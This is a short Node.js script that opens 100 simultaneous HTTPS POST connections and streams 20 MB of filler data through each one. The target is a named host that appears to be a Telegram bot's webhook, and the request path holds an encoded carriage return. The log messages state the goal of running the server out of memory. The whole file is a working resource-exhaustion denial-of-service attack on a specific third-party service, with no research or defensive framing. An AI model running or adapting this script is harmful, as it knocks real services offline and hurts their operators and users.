const https = require('https');

const connections = 100;
const payloadSize = 20 * 1024 * 1024; // 20 MB per connection
const chunk = Buffer.alloc(1024 * 1024, 'A'); // 1MB chunks

console.log('Starting ' + connections + ' concurrent connections...');

let completed = 0;

for (let i = 0; i < connections; i++) {
    const req = https.request({
        hostname: 'groza-bot.alwaysdata.net',
        path: '/api/telegram-webhook-8516017309%0D',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': payloadSize
        }
    }, (res) => {
        console.log('Conn ' + i + ' Status: ' + res.statusCode);
        res.on('data', () => {});
    });

    req.on('error', (e) => {
        console.log('Conn ' + i + ' Error (likely OOM!): ' + e.message);
    });

    // Send data progressively to avoid local memory limits
    let sent = 0;
    function sendNext() {
        if (sent >= payloadSize) {
            req.end();
            completed++;
            if (completed === connections) console.log('All connections finished sending.');
            return;
        }
        req.write(chunk);
        sent += chunk.length;
        setImmediate(sendNext);
    }
    sendNext();
}
